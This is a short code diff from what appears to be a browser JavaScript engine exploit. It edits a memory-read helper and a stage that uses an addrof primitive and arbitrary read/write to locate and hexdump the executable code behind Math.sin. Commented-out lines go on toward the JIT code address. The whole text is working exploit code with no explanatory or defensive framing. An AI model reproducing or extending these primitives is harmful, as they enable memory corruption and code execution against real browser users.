@@ -581,7 +581,7 @@ for (var i = 0; i < 1000; ++i) {
         },
         
         read(addr, length) {
-            var a = new Array(length);
+            var a = new Uint8Array(length);
             var i;
             var v;
 
@@ -632,11 +632,11 @@ for (var i = 0; i < 1000; ++i) {
             unboxed1 = null
         },
     };
-    print("we have arbitrary r/w with JSArray :)");
-   memory = stage2;
+        print("we have arbitrary r/w with JSArray :)");
+   	memory = stage2;
 	var sinFuncAddr = addrof(Math.sin);
         print("Math.sin() @ " + sinFuncAddr);
-        var executableAddr = memory.read(sinFuncAddr,0x100);
+        var executableAddr = memory.read(sinFuncAddr,0x40);
 	print(hexdump(executableAddr));
         /*print("Math.sin() ExecutableAddr @ " + executableAddr);
         var jitCodeAddr = memory.read64(executableAddr , 3);
